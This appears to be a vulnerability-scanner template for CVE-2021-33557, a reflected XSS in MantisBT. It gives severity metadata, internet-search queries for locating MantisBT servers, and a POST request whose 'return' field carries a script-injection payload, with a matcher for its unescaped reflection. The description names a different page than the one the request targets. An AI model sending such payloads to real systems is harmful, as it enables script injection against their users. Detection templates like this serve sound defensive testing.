id: CVE-2021-33557

info:
  name: XSS in MantisBT manage_custom_field_edit_page.php
  author: ProjectDiscoveryAI
  severity: medium
  description: An XSS issue was discovered in manage_custom_field_edit_page.php in MantisBT before 2.25.2. Unescaped output of the return parameter allows an attacker to inject code into a hidden input field.
  impact: |
    Allows attackers to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Upgrade MantisBT to the latest version to patch the XSS vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-33557
    cwe-id: CWE-79
    epss-score: 0.00112
    epss-percentile: 0.45929
    cpe: cpe:2.3:a:mantisbt:mantisbt:*:*:*:*:*:*:*:*
  metadata:
    vendor: mantisbt
    product: mantisbt
    shodan-query: http.favicon.hash:662709064
    fofa-query:
      - body="administration - installation - mantisbt"
      - icon_hash=662709064
      - title="mantisbt"
    google-query: intitle:"mantisbt"

http:
  - method: POST
    path:
      - "{{BaseURL}}/login_password_page.php"

    body: |
      username=user123&return=%2Fbugs%2Fview.php%3Fid%3D28552%3Cscript%3Ealert('XSS')%3C%2Fscript%3E

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<input type='hidden' name='return' value='/bugs/view.php?id=28552<script>alert('XSS')</script>'"
        part: body
